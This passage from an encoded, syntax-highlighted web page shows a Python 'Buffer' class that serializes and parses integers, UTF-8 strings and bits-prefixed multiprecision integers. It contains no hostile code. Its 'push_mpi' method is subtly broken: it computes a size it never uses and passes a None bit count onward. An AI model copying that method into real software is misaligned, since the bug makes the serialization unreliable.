fer.py</p> <!----><pre class=3D"shiki github-dark-default" style=3D"backgro=
und-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span class=3D"line">=
<span style=3D"color:#FF7B72">class</span><span style=3D"color:#FFA657"> Bu=
ffer</span><span style=3D"color:#E6EDF3">:</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    inner: </span><span =
style=3D"color:#79C0FF">bytes</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#79C0FF"> __init__</span><span style=3D"color:#E6EDF3">(self, in=
ner: </span><span style=3D"color:#79C0FF">bytes</span><span style=3D"color:=
#FF7B72"> =3D</span><span style=3D"color:#FF7B72"> b</span><span style=3D"c=
olor:#A5D6FF">""</span><span style=3D"color:#E6EDF3">):</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.inner </span><span style=3D"color:#FF7B72">=3D</s=
pan><span style=3D"color:#E6EDF3"> inner</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#79C0FF"> __bytes__</span><span style=3D"color:#E6EDF3">(self) -=
> </span><span style=3D"color:#79C0FF">bytes</span><span style=3D"color:#E6=
EDF3">:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        return</span><sp=
an style=3D"color:#79C0FF"> self</span><span style=3D"color:#E6EDF3">.inner=
</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#79C0FF"> __len__</span><span style=3D"color:#E6EDF3">(self) -> =
</span><span style=3D"color:#79C0FF">int</span><span style=3D"color:#E6EDF3=
">:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        return</span><sp=
an style=3D"color:#79C0FF"> len</span><span style=3D"color:#E6EDF3">(</span=
><span style=3D"color:#79C0FF">self</span><span style=3D"color:#E6EDF3">.in=
ner)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> is_empty</span><span style=3D"color:#E6EDF3">(self) ->=
 </span><span style=3D"color:#79C0FF">bool</span><span style=3D"color:#E6ED=
F3">:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        return</span><sp=
an style=3D"color:#79C0FF"> len</span><span style=3D"color:#E6EDF3">(</span=
><span style=3D"color:#79C0FF">self</span><span style=3D"color:#E6EDF3">.in=
ner) </span><span style=3D"color:#FF7B72">=3D=3D</span><span style=3D"color=
:#79C0FF"> 0</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> push_bytes</span><span style=3D"color:#E6EDF3">(self, =
data: </span><span style=3D"color:#79C0FF">bytes</span><span style=3D"color=
:#E6EDF3">):</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.inner </span><span style=3D"color:#FF7B72">+=3D</=
span><span style=3D"color:#79C0FF"> bytes</span><span style=3D"color:#E6EDF=
3">(data)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> push_mpi</span><span style=3D"color:#E6EDF3">(self, da=
ta: </span><span style=3D"color:#79C0FF">bytes</span><span style=3D"color:#=
E6EDF3">, bits: </span><span style=3D"color:#79C0FF">int</span><span style=
=3D"color:#FF7B72"> |</span><span style=3D"color:#79C0FF"> None</span><span=
 style=3D"color:#E6EDF3">):</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        if</span><span s=
tyle=3D"color:#E6EDF3"> bits </span><span style=3D"color:#FF7B72">is</span>=
<span style=3D"color:#79C0FF"> None</span><span style=3D"color:#E6EDF3">:</=
span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            size </span>=
<span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF"> len<=
/span><span style=3D"color:#E6EDF3">(data)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            pos </span><=
span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF"> 0</sp=
an></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            while</span>=
<span style=3D"color:#E6EDF3"> data[pos] </span><span style=3D"color:#FF7B7=
2">=3D=3D</span><span style=3D"color:#79C0FF"> 0</span><span style=3D"color=
:#E6EDF3">:</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                size </s=
pan><span style=3D"color:#FF7B72">-=3D</span><span style=3D"color:#79C0FF">=
 8</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                pos </sp=
an><span style=3D"color:#FF7B72">+=3D</span><span style=3D"color:#79C0FF"> =
1</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            if</span><sp=
an style=3D"color:#E6EDF3"> data[pos] </span><span style=3D"color:#FF7B72">=
>=3D</span><span style=3D"color:#FF7B72"> 0x</span><span style=3D"color:#79=
C0FF">80</span><span style=3D"color:#E6EDF3">:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">                pass</sp=
an></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            elif</span><=
span style=3D"color:#E6EDF3"> data[pos] </span><span style=3D"color:#FF7B72=
">>=3D</span><span style=3D"color:#FF7B72"> 0x</span><span style=3D"color:#=
79C0FF">40</span><span style=3D"color:#E6EDF3">:</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                size </s=
pan><span style=3D"color:#FF7B72">-=3D</span><span style=3D"color:#79C0FF">=
 1</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            elif</span><=
span style=3D"color:#E6EDF3"> data[pos] </span><span style=3D"color:#FF7B72=
">>=3D</span><span style=3D"color:#FF7B72"> 0x</span><span style=3D"color:#=
79C0FF">20</span><span style=3D"color:#E6EDF3">:</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                size </s=
pan><span style=3D"color:#FF7B72">-=3D</span><span style=3D"color:#79C0FF">=
 2</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            elif</span><=
span style=3D"color:#E6EDF3"> data[pos] </span><span style=3D"color:#FF7B72=
">>=3D</span><span style=3D"color:#FF7B72"> 0x</span><span style=3D"color:#=
79C0FF">10</span><span style=3D"color:#E6EDF3">:</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                size </s=
pan><span style=3D"color:#FF7B72">-=3D</span><span style=3D"color:#79C0FF">=
 3</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            elif</span><=
span style=3D"color:#E6EDF3"> data[pos] </span><span style=3D"color:#FF7B72=
">>=3D</span><span style=3D"color:#FF7B72"> 0x</span><span style=3D"color:#=
79C0FF">08</span><span style=3D"color:#E6EDF3">:</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                size </s=
pan><span style=3D"color:#FF7B72">-=3D</span><span style=3D"color:#79C0FF">=
 4</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            elif</span><=
span style=3D"color:#E6EDF3"> data[pos] </span><span style=3D"color:#FF7B72=
">>=3D</span><span style=3D"color:#FF7B72"> 0x</span><span style=3D"color:#=
79C0FF">04</span><span style=3D"color:#E6EDF3">:</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                size </s=
pan><span style=3D"color:#FF7B72">-=3D</span><span style=3D"color:#79C0FF">=
 5</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            elif</span><=
span style=3D"color:#E6EDF3"> data[pos] </span><span style=3D"color:#FF7B72=
">>=3D</span><span style=3D"color:#FF7B72"> 0x</span><span style=3D"color:#=
79C0FF">02</span><span style=3D"color:#E6EDF3">:</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                size </s=
pan><span style=3D"color:#FF7B72">-=3D</span><span style=3D"color:#79C0FF">=
 6</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            elif</span><=
span style=3D"color:#E6EDF3"> data[pos] </span><span style=3D"color:#FF7B72=
">>=3D</span><span style=3D"color:#FF7B72"> 0x</span><span style=3D"color:#=
79C0FF">01</span><span style=3D"color:#E6EDF3">:</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                size </s=
pan><span style=3D"color:#FF7B72">-=3D</span><span style=3D"color:#79C0FF">=
 7</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.push_u16be(bits)</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.push_bytes(data)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> push_utf8</span><span style=3D"color:#E6EDF3">(self, t=
ext: </span><span style=3D"color:#79C0FF">str</span><span style=3D"color:#E=
6EDF3">):</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.push_bytes(text.encode(</span><span style=3D"colo=
r:#A5D6FF">"utf8"</span><span style=3D"color:#E6EDF3">))</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> push_int</span><span style=3D"color:#E6EDF3">(self, va=
lue: </span><span style=3D"color:#79C0FF">int</span><span style=3D"color:#E=
6EDF3">, count: </span><span style=3D"color:#79C0FF">int</span><span style=
=3D"color:#E6EDF3">, byteorder: </span><span style=3D"color:#79C0FF">str</s=
pan><span style=3D"color:#FF7B72"> =3D</span><span style=3D"color:#A5D6FF">=
 "big"</span><span style=3D"color:#E6EDF3">, signed: </span><span style=3D"=
color:#79C0FF">bool</span><span style=3D"color:#FF7B72"> =3D</span><span st=
yle=3D"color:#79C0FF"> False</span><span style=3D"color:#E6EDF3">):</span><=
/span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.push_bytes(</span><span style=3D"color:#79C0FF">i=
nt</span><span style=3D"color:#E6EDF3">(value).to_bytes(count, </span><span=
 style=3D"color:#FFA657">byteorder</span><span style=3D"color:#FF7B72">=3D<=
/span><span style=3D"color:#E6EDF3">byteorder, </span><span style=3D"color:=
#FFA657">signed</span><span style=3D"color:#FF7B72">=3D</span><span style=
=3D"color:#E6EDF3">signed))</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> push_i8</span><span style=3D"color:#E6EDF3">(self, val=
ue: </span><span style=3D"color:#79C0FF">int</span><span style=3D"color:#E6=
EDF3">):</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.push_int(value, </span><span style=3D"color:#79C0=
FF">1</span><span style=3D"color:#E6EDF3">, </span><span style=3D"color:#FF=
A657">signed</span><span style=3D"color:#FF7B72">=3D</span><span style=3D"c=
olor:#79C0FF">True</span><span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> push_i16be</span><span style=3D"color:#E6EDF3">(self, =
value: </span><span style=3D"color:#79C0FF">int</span><span style=3D"color:=
#E6EDF3">):</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.push_int(value, </span><span style=3D"color:#79C0=
FF">2</span><span style=3D"color:#E6EDF3">, </span><span style=3D"color:#FF=
A657">byteorder</span><span style=3D"color:#FF7B72"> =3D</span><span style=
=3D"color:#A5D6FF"> "big"</span><span style=3D"color:#E6EDF3">, </span><spa=
n style=3D"color:#FFA657">signed</span><span style=3D"color:#FF7B72">=3D</s=
pan><span style=3D"color:#79C0FF">True</span><span style=3D"color:#E6EDF3">=
)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> push_i16le</span><span style=3D"color:#E6EDF3">(self, =
value: </span><span style=3D"color:#79C0FF">int</span><span style=3D"color:=
#E6EDF3">):</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.push_int(value, </span><span style=3D"color:#79C0=
FF">2</span><span style=3D"color:#E6EDF3">, </span><span style=3D"color:#FF=
A657">byteorder</span><span style=3D"color:#FF7B72"> =3D</span><span style=
=3D"color:#A5D6FF"> "little"</span><span style=3D"color:#E6EDF3">, </span><=
span style=3D"color:#FFA657">signed</span><span style=3D"color:#FF7B72">=3D=
</span><span style=3D"color:#79C0FF">True</span><span style=3D"color:#E6EDF=
3">)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> push_i32be</span><span style=3D"color:#E6EDF3">(self, =
value: </span><span style=3D"color:#79C0FF">int</span><span style=3D"color:=
#E6EDF3">):</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.push_int(value, </span><span style=3D"color:#79C0=
FF">4</span><span style=3D"color:#E6EDF3">, </span><span style=3D"color:#FF=
A657">byteorder</span><span style=3D"color:#FF7B72"> =3D</span><span style=
=3D"color:#A5D6FF"> "big"</span><span style=3D"color:#E6EDF3">, </span><spa=
n style=3D"color:#FFA657">signed</span><span style=3D"color:#FF7B72">=3D</s=
pan><span style=3D"color:#79C0FF">True</span><span style=3D"color:#E6EDF3">=
)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> push_i32le</span><span style=3D"color:#E6EDF3">(self, =
value: </span><span style=3D"color:#79C0FF">int</span><span style=3D"color:=
#E6EDF3">):</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.push_int(value, </span><span style=3D"color:#79C0=
FF">4</span><span style=3D"color:#E6EDF3">, </span><span style=3D"color:#FF=
A657">byteorder</span><span style=3D"color:#FF7B72"> =3D</span><span style=
=3D"color:#A5D6FF"> "little"</span><span style=3D"color:#E6EDF3">, </span><=
span style=3D"color:#FFA657">signed</span><span style=3D"color:#FF7B72">=3D=
</span><span style=3D"color:#79C0FF">True</span><span style=3D"color:#E6EDF=
3">)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> push_i64be</span><span style=3D"color:#E6EDF3">(self, =
value: </span><span style=3D"color:#79C0FF">int</span><span style=3D"color:=
#E6EDF3">):</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.push_int(value, </span><span style=3D"color:#79C0=
FF">8</span><span style=3D"color:#E6EDF3">, </span><span style=3D"color:#FF=
A657">byteorder</span><span style=3D"color:#FF7B72"> =3D</span><span style=
=3D"color:#A5D6FF"> "big"</span><span style=3D"color:#E6EDF3">, </span><spa=
n style=3D"color:#FFA657">signed</span><span style=3D"color:#FF7B72">=3D</s=
pan><span style=3D"color:#79C0FF">True</span><span style=3D"color:#E6EDF3">=
)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> push_i64le</span><span style=3D"color:#E6EDF3">(self, =
value: </span><span style=3D"color:#79C0FF">int</span><span style=3D"color:=
#E6EDF3">):</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.push_int(value, </span><span style=3D"color:#79C0=
FF">8</span><span style=3D"color:#E6EDF3">, </span><span style=3D"color:#FF=
A657">byteorder</span><span style=3D"color:#FF7B72"> =3D</span><span style=
=3D"color:#A5D6FF"> "little"</span><span style=3D"color:#E6EDF3">, </span><=
span style=3D"color:#FFA657">signed</span><span style=3D"color:#FF7B72">=3D=
</span><span style=3D"color:#79C0FF">True</span><span style=3D"color:#E6EDF=
3">)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> push_u8</span><span style=3D"color:#E6EDF3">(self, val=
ue: </span><span style=3D"color:#79C0FF">int</span><span style=3D"color:#E6=
EDF3">):</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.push_int(value, </span><span style=3D"color:#79C0=
FF">1</span><span style=3D"color:#E6EDF3">, </span><span style=3D"color:#FF=
A657">signed</span><span style=3D"color:#FF7B72">=3D</span><span style=3D"c=
olor:#79C0FF">False</span><span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> push_u16be</span><span style=3D"color:#E6EDF3">(self, =
value: </span><span style=3D"color:#79C0FF">int</span><span style=3D"color:=
#E6EDF3">):</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.push_int(value, </span><span style=3D"color:#79C0=
FF">2</span><span style=3D"color:#E6EDF3">, </span><span style=3D"color:#FF=
A657">byteorder</span><span style=3D"color:#FF7B72"> =3D</span><span style=
=3D"color:#A5D6FF"> "big"</span><span style=3D"color:#E6EDF3">, </span><spa=
n style=3D"color:#FFA657">signed</span><span style=3D"color:#FF7B72">=3D</s=
pan><span style=3D"color:#79C0FF">False</span><span style=3D"color:#E6EDF3"=
>)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> push_u16le</span><span style=3D"color:#E6EDF3">(self, =
value: </span><span style=3D"color:#79C0FF">int</span><span style=3D"color:=
#E6EDF3">):</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.push_int(value, </span><span style=3D"color:#79C0=
FF">2</span><span style=3D"color:#E6EDF3">, </span><span style=3D"color:#FF=
A657">byteorder</span><span style=3D"color:#FF7B72"> =3D</span><span style=
=3D"color:#A5D6FF"> "little"</span><span style=3D"color:#E6EDF3">, </span><=
span style=3D"color:#FFA657">signed</span><span style=3D"color:#FF7B72">=3D=
</span><span style=3D"color:#79C0FF">False</span><span style=3D"color:#E6ED=
F3">)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> push_u32be</span><span style=3D"color:#E6EDF3">(self, =
value: </span><span style=3D"color:#79C0FF">int</span><span style=3D"color:=
#E6EDF3">):</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.push_int(value, </span><span style=3D"color:#79C0=
FF">4</span><span style=3D"color:#E6EDF3">, </span><span style=3D"color:#FF=
A657">byteorder</span><span style=3D"color:#FF7B72"> =3D</span><span style=
=3D"color:#A5D6FF"> "big"</span><span style=3D"color:#E6EDF3">, </span><spa=
n style=3D"color:#FFA657">signed</span><span style=3D"color:#FF7B72">=3D</s=
pan><span style=3D"color:#79C0FF">False</span><span style=3D"color:#E6EDF3"=
>)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> push_u32le</span><span style=3D"color:#E6EDF3">(self, =
value: </span><span style=3D"color:#79C0FF">int</span><span style=3D"color:=
#E6EDF3">):</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.push_int(value, </span><span style=3D"color:#79C0=
FF">4</span><span style=3D"color:#E6EDF3">, </span><span style=3D"color:#FF=
A657">byteorder</span><span style=3D"color:#FF7B72"> =3D</span><span style=
=3D"color:#A5D6FF"> "little"</span><span style=3D"color:#E6EDF3">, </span><=
span style=3D"color:#FFA657">signed</span><span style=3D"color:#FF7B72">=3D=
</span><span style=3D"color:#79C0FF">False</span><span style=3D"color:#E6ED=
F3">)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> push_u64be</span><span style=3D"color:#E6EDF3">(self, =
value: </span><span style=3D"color:#79C0FF">int</span><span style=3D"color:=
#E6EDF3">):</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.push_int(value, </span><span style=3D"color:#79C0=
FF">8</span><span style=3D"color:#E6EDF3">, </span><span style=3D"color:#FF=
A657">byteorder</span><span style=3D"color:#FF7B72"> =3D</span><span style=
=3D"color:#A5D6FF"> "big"</span><span style=3D"color:#E6EDF3">, </span><spa=
n style=3D"color:#FFA657">signed</span><span style=3D"color:#FF7B72">=3D</s=
pan><span style=3D"color:#79C0FF">False</span><span style=3D"color:#E6EDF3"=
>)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> push_u64le</span><span style=3D"color:#E6EDF3">(self, =
value: </span><span style=3D"color:#79C0FF">int</span><span style=3D"color:=
#E6EDF3">):</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.push_int(value, </span><span style=3D"color:#79C0=
FF">8</span><span style=3D"color:#E6EDF3">, </span><span style=3D"color:#FF=
A657">byteorder</span><span style=3D"color:#FF7B72"> =3D</span><span style=
=3D"color:#A5D6FF"> "little"</span><span style=3D"color:#E6EDF3">, </span><=
span style=3D"color:#FFA657">signed</span><span style=3D"color:#FF7B72">=3D=
</span><span style=3D"color:#79C0FF">False</span><span style=3D"color:#E6ED=
F3">)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> take_bytes</span><span style=3D"color:#E6EDF3">(self, =
count: </span><span style=3D"color:#79C0FF">int</span><span style=3D"color:=
#E6EDF3">) -> </span><span style=3D"color:#79C0FF">bytes</span><span style=
=3D"color:#E6EDF3">:</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        value </span><sp=
an style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF"> self</s=
pan><span style=3D"color:#E6EDF3">.inner[:count]</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        self</span><span=
 style=3D"color:#E6EDF3">.inner </span><span style=3D"color:#FF7B72">=3D</s=
pan><span style=3D"color:#79C0FF"> self</span><span style=3D"color:#E6EDF3"=
>.inner[count:]</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        return</span><sp=
an style=3D"color:#E6EDF3"> value</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> take_mpi</span><span style=3D"color:#E6EDF3">(self) ->=
 tuple[</span><span style=3D"color:#79C0FF">int</span><span style=3D"color:=
#E6EDF3">, </span><span style=3D"color:#79C0FF">bytes</span><span style=3D"=
color:#E6EDF3">]:</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        bits </span><spa=
n style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF"> self</sp=
an><span style=3D"color:#E6EDF3">.take_u16be()</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        return</span><sp=
an style=3D"color:#E6EDF3"> (bits, </span><span style=3D"color:#79C0FF">sel=
f</span><span style=3D"color:#E6EDF3">.take_bytes((bits </span><span style=
=3D"color:#FF7B72">+</span><span style=3D"color:#79C0FF"> 7</span><span sty=
le=3D"color:#E6EDF3">)</span><span style=3D"color:#FF7B72">//</span><span s=
tyle=3D"color:#79C0FF">8</span><span style=3D"color:#E6EDF3">))</span></spa=
n>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> take_utf8</span><span style=3D"color:#E6EDF3">(self, c=
ount: </span><span style=3D"color:#79C0FF">int</span><span style=3D"color:#=
FF7B72"> |</span><span style=3D"color:#79C0FF"> None</span><span style=3D"c=
olor:#FF7B72"> =3D</span><span style=3D"color:#79C0FF"> None</span><span st=
yle=3D"color:#E6EDF3">) -> </span><span style=3D"color:#79C0FF">str</span><=
span style=3D"color:#E6EDF3">:</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        text: </span><sp=
an style=3D"color:#79C0FF">str</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        if</span><span s=
tyle=3D"color:#E6EDF3"> count </span><span style=3D"color:#FF7B72">is</span=
><span style=3D"color:#79C0FF"> None</span><span style=3D"color:#E6EDF3">:<=
/span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            count </span=
><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF"> sel=
f</span><span style=3D"color:#E6EDF3">.inner.find(</span><span style=3D"col=
or:#79C0FF">0</span><span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            text </span>=
<span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF"> self=
</span><span style=3D"color:#E6EDF3">.take_bytes(count)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            _null </span=
><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF"> sel=
f</span><span style=3D"color:#E6EDF3">.take_u8()</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        else</span><span=
 style=3D"color:#E6EDF3">:</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            text </span>=
<span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF"> self=
</span><span style=3D"color:#E6EDF3">.take_bytes(count)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        return</span><sp=
an style=3D"color:#E6EDF3"> text.decode(</span><span style=3D"color:#A5D6FF=
">"utf8"</span><span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> take_int</span><span style=3D"color:#E6EDF3">(self, co=
unt: </span><span style=3D"color:#79C0FF">int</span><span style=3D"color:#E=
6EDF3">, byteorder: </span><span style=3D"color:#79C0FF">str</span><span st=
yle=3D"color:#FF7B72"> =3D</span><span style=3D"color:#A5D6FF"> "big"</span=
><span style=3D"color:#E6EDF3">, signed: </span><span style=3D"color:#79C0F=
F">bool</span><span style=3D"color:#FF7B72"> =3D</span><span style=3D"color=
:#79C0FF"> False</span><span style=3D"color:#E6EDF3">) -> </span><span styl=
e=3D"color:#79C0FF">int</span><span style=3D"color:#E6EDF3">:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        return</span><sp=
an style=3D"color:#79C0FF"> int</span><span style=3D"color:#E6EDF3">.from_b=
ytes(</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">            self</span><=
span style=3D"color:#E6EDF3">.take_bytes(count),</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">            byteorder</s=
pan><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3">b=
yteorder,</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">            signed</span=
><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3">sign=
ed,</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        )</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> take_i8</span><span style=3D"color:#E6EDF3">(self) -> =
</span><span style=3D"color:#79C0FF">int</span><span style=3D"color:#E6EDF3=
">:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        return</span><sp=
an style=3D"color:#79C0FF"> self</span><span style=3D"color:#E6EDF3">.take_=
int(</span><span style=3D"color:#79C0FF">1</span><span style=3D"color:#E6ED=
F3">, </span><span style=3D"color:#FFA657">signed</span><span style=3D"colo=
r:#FF7B72">=3D</span><span style=3D"color:#79C0FF">True</span><span style=
=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> take_i16be</span><span style=3D"color:#E6EDF3">(self) =
-> </span><span style=3D"color:#79C0FF">int</span><span style=3D"color:#E6E=
DF3">:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        return</span><sp=
an style=3D"color:#79C0FF"> self</span><span style=3D"color:#E6EDF3">.take_=
int(</span><span style=3D"color:#79C0FF">2</span><span style=3D"color:#E6ED=
F3">, </span><span style=3D"color:#FFA657">byteorder</span><span style=3D"c=
olor:#FF7B72">=3D</span><span style=3D"color:#A5D6FF">"big"</span><span sty=
le=3D"color:#E6EDF3">, </span><span style=3D"color:#FFA657">signed</span><s=
pan style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF">True</s=
pan><span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    def</span><span styl=
e=3D"color:#D2A8FF"> take_i16le</span><span style=3D"color:#E6EDF3">(self) =
-> </span><span style=3D"color:#79C0FF">int</span><span style=3D"color:#E6E=
DF3">:</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        return</span><sp=
an style=3D"color:#79C0FF"> self</span><span style=3D"color:#E6EDF3">.take_=
int(</span><span style=3D"color:#79C0FF">2</span><span style=3D"color:#E6ED=
F3">, </span><span style=3D"color:#FFA657">byteorder</span><span style=3D"c=
olor:#FF7B72">=3D</span><span style=3D"color:#A5D6FF">"little"</span><span =
